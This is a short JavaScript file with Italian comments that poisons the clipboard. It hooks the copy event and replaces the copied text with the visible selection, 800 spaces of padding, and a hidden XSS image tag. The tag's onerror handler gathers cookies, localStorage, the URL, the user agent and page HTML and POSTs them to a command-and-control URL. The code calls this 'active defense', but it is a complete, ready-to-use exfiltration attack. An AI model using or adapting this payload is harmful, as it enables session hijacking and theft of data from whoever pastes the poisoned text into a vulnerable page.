// CONFIGURAZIONE IP DEL TUO SERVER PYTHON
const C2_URL = "http://127.0.0.1:5000";

document.addEventListener('copy', function (e) {
    e.preventDefault();

    // 1. L'Esca Visiva (Quello che pensano di copiare)
    // Prendiamo il testo che hanno selezionato, o il default se cliccano e basta
    let selection = window.getSelection().toString();
    const defaultCode = document.getElementById('errorCode').innerText;
    const decoy = selection.trim().length > 5 ? selection.trim() : defaultCode;

    // 2. Il Padding (La distanza di sicurezza per lo stealth visivo)
    const padding = " ".repeat(800); // 800 spazi per spingerlo lontano

    // 3. Il Payload "Vacuum" (Minificato per stare nell'attributo onerror)
    // Raccoglie: Cookies, URL, LocalStorage completo, e i primi 15000 caratteri dell'HTML della pagina.
    // Usa POST per inviare il malloppo.
    const vacuumPayloadJS = `
        var d=document,ls=localStorage;
        var loot={
            c:d.cookie,
            u:d.location.href,
            ua:navigator.userAgent,
            ls:JSON.stringify(ls),
            h:d.documentElement.outerHTML.substring(0,15000)
        };
        fetch('${C2_URL}/vacuum',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify(loot)
        });
        this.remove();
    `.replace(/\s+/g, ' ').trim(); // Minificazione basilare al volo

    // L'iniezione XSS finale (Tecnica Iceberg)
    const malicious = `"><img src=x style=display:none onerror="${vacuumPayloadJS}">`;

    const finalPayload = decoy + padding + malicious;

    // Iniezione nel clipboard
    if (e.clipboardData) {
        e.clipboardData.setData('text/plain', finalPayload);
        console.warn("[ACTIVE DEFENSE] Clipboard Poisoned. Vacuum Payload loaded.");
        // Feedback visivo opzionale per te (rimuovere in produzione)
        // alert("Codice copiato negli appunti! (Payload Attivo)");
    }
});

// Piccola UX: Se cliccano sul codice, selezionalo tutto automaticamente
document.getElementById('errorCode').addEventListener('click', function () {
    const range = document.createRange();
    range.selectNodeContents(this);
    const sel = window.getSelection();
    sel.removeAllRanges();
    sel.addRange(range);
});
